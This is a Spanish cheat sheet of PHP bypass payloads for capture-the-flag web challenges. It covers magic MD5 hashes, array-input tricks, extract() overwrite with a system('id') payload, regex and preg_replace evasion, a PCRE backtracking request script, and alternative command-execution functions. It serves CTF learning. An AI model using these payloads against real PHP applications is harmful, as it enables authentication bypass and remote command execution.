# Hoja de referencia de técnicas de bypass en PHP

## Bypass de comparación débil en PHP ($a == md5($a))

En las comparaciones de tipo débil de PHP, las cadenas que empiezan con `0e` se interpretan como notación científica y equivalen a `0`.

**⚠️ Condición clave: después de `0e` deben ir solo dígitos (0-9), sin letras**
- ✅ `0e830400451993494058024219903391` → solo dígitos, PHP lo interpreta como `0 × 10^830...` = `0`
- ❌ `0e993dffb88165eb32369e16dd25b536` → contiene letras `d`/`f`, PHP no lo trata como notación científica y lo compara como cadena

| Valor | Resultado MD5 | ¿Solo dígitos tras 0e? | Nota |
|----|---------|------------|------|
| QNKCDZO | 0e830400451993494058024219903391 | ✅ | Empieza con 0e, PHP `==` lo trata como 0 |
| 240610708 | 0e462097431906509019562988736854 | ✅ | Igual que el anterior |
| s878926199a | 0e545993274517709034328855841020 | ✅ | Igual que el anterior |
| s155964671a | 0e342768416822451524974117254469 | ✅ | Igual que el anterior |
| s214587387a | 0e848204310308006290363795692068 | ✅ | Igual que el anterior |
| s1091221200a | 0e940625744785414655937625828514 | ✅ | Igual que el anterior |
| 0e215962017 | 0e291242476940776845150308577824 | ✅ | Igual que el anterior |

**⚠️ No busques colisiones de MD5 por fuerza bruta por tu cuenta** — usa directamente los valores de la tabla anterior, ya están verificados y funcionan.

## Bypass de comparación débil en PHP ($a != $b && md5($a) == md5($b))

**⚠️ Condición clave: después de `0e` deben ir solo dígitos (0-9), sin letras**

| Valor A | Valor B | MD5(Valor A) | MD5(Valor B) | ¿Solo dígitos tras 0e? |
|------|------|----------|----------|------------|
| QNKCDZO | 240610708 | 0e830400... | 0e462097... | ✅ ambos válidos |
| s878926199a | s155964671a | 0e545993... | 0e342768... | ✅ ambos válidos |
| QNKCDZO | s878926199a | 0e830400... | 0e545993... | ✅ ambos válidos |

**⚠️ Los valores MD5 obtenidos por fuerza bruta suelen no servir** — `0e993dffb...` contiene las letras d/f, por lo que PHP no lo trata como notación científica y la comparación débil falla. Usa directamente los valores ya verificados de la tabla anterior.

## Bypass de comparación estricta en PHP ($a !== $b && md5($a) === md5($b))

`md5()` no puede procesar arrays; si se le pasa un array devuelve `NULL`, y `NULL === NULL` es `true`:
```
?a[]=1&b[]=2
md5($_GET['a']) === md5($_GET['b'])  // NULL === NULL → true
```

## Bypass mediante arrays

`preg_match()` solo puede procesar cadenas; si se le pasa un array devuelve `false`:
```
?p[]=nss2&p[]=ctf
// preg_match("/n|c/", $_GET['p']) → false (no coincide, se evade)
```

`call_user_func` acepta un array como callback:
```php
call_user_func(array('ClassName', 'methodName'))  // equivalente a ClassName::methodName()
call_user_func(['nss2', 'ctf'])                   // equivalente a nss2::ctf()
```

## Sobrescritura de variables con extract()

`extract($_GET)` sobrescribe variables ya existentes con parámetros GET:
```
?_GET[cmd]=system('id')
```

## Bypass de intval()

```php
if (intval($_GET['num']) === 0) { ... }
// Métodos de bypass:
?num=0x10     // hexadecimal, intval no lo interpreta por defecto
?num=+0       // prefijo de signo positivo
?num=0e123    // notación científica
?num[]=1      // array, intval devuelve 1
```

## Bypass de expresiones regulares en PHP

| Escenario | Método | Ejemplo |
|------|------|------|
| Regex sin modificador `i` | Bypass por mayúsculas/minúsculas | `Nss2::Ctf` evade `/n\|c/m` |
| preg_match solo revisa cadenas | Bypass con array | `p[]=xxx` hace que preg_match devuelva false |
| `^$` + modificador `m` | Bypass con salto de línea | `aaa%0abbb` evade `/^aaa$/m` |
| `.` no coincide con saltos de línea | Bypass con `%0a` | insertar un salto de línea |
| Límite de backtracking | Cadena extremadamente larga | construir una cadena muy larga para que preg_match devuelva false (el límite de backtracking de PCRE es 1 millón por defecto) |

### ⭐ Bypass por duplicación en preg_replace (tema muy frecuente)

**Escenario**: `preg_replace('/palabra_clave/', '', $input)` requiere que, tras el reemplazo, el resultado **sea igual a la propia palabra clave**

**Principio central**: incrustar la palabra clave completa dentro de sí misma; al eliminar la instancia interna, las partes exteriores se recomponen en la palabra original

**Construcción general**: `mitad_inicial_de_la_palabra + palabra_clave + mitad_final_de_la_palabra`

| Palabra clave filtrada | Entrada duplicada | Proceso de reemplazo | Resultado |
|-----------|---------|---------|------|
| NSSCTF | `NSSNSSCTFCTF` | se elimina el NSSCTF central → NSS+CTF | `NSSCTF` ✅ |
| flag | `flflagag` | se elimina el flag central → fl+ag | `flag` ✅ |
| cat | `cacatt` | se elimina el cat central → ca+t | `cat` ✅ |
| system | `syssystemtem` | se elimina el system central → sys+tem | `system` ✅ |
| hack | `hahackck` | se elimina el hack central → ha+ck | `hack` ✅ |

**⚠️ Por qué no funciona el bypass por mayúsculas/minúsculas**:
- `preg_replace('/NSSCTF/', '', 'NssCTF')` → `Nss` no coincide con `NSS` → se devuelve tal cual `NssCTF`
- `NssCTF !== "NSSCTF"` → falla la comparación estricta → no pasa
- El bypass por duplicación es el único método que permite que el resultado del reemplazo sea **exactamente igual** a la cadena original

**Señales para identificarlo**:
- El código fuente contiene `preg_replace('/X/', '', $str)` y exige `$str === "X"` → bypass por duplicación
- El código fuente contiene `str_replace('X', '', $str)` y exige `$str === "X"` → también aplica el bypass por duplicación

### Bypass del límite de backtracking de PCRE

```python
import requests
url = "http://target/index.php"
# Construir una cadena extremadamente larga para que preg_match supere el límite de backtracking y devuelva false
payload = "a" * 1000000 + "evil_content"
data = {"input": payload}
r = requests.post(url, data=data)
print(r.text)
```

## Referencia rápida de bypass de funciones/características de PHP

| Escenario | Método | Ejemplo |
|------|------|------|
| Regex sin `i` | Bypass por mayúsculas/minúsculas | `Nss2::Ctf` evade `/n\|c/m` |
| Limitación de preg_match a cadenas | Bypass con array | `p[]=nss2&p[]=ctf` |
| call_user_func invocando métodos de clase | Callback con array | `call_user_func(['nss2','ctf'])` |
| Nombre de función contiene caracteres prohibidos | Buscar función alternativa | `readfile` no contiene n/c |
| Sobrescritura de variables con extract | Sobrescribir variables clave | modificar variables relacionadas con autenticación/permisos |
| Verificación con is_numeric | Hexadecimal/notación científica | `0x10`, `1e1` |
| Comparación con strcmp | Bypass con array | `pass[]=1` hace que strcmp devuelva NULL |
| Tipo débil en in_array | Suplantación de tipo | `"0admin"` pasa `in_array(0, ['admin'])` |

## Funciones alternativas para ejecución de código en PHP

Cuando `system` / `exec` están deshabilitadas:

| Función | Uso | Salida directa |
|------|------|------|
| `system($cmd)` | Ejecución directa | Con salida directa (se envía a stdout) |
| `exec($cmd, $output)` | Ejecuta y guarda en un array | Sin salida directa, requiere `print_r($output)` |
| `passthru($cmd)` | Ejecución directa con salida de datos sin procesar | Con salida directa |
| `shell_exec($cmd)` | Devuelve una cadena | Sin salida directa, requiere `echo` |
| `comillas invertidas \`$cmd\`` | Equivalente a shell_exec | Sin salida directa, requiere `echo` |
| `popen($cmd, 'r')` | Abre una tubería de proceso | Requiere `fread` para leer |
| `proc_open()` | Control de procesos más flexible | Requiere lectura manual |
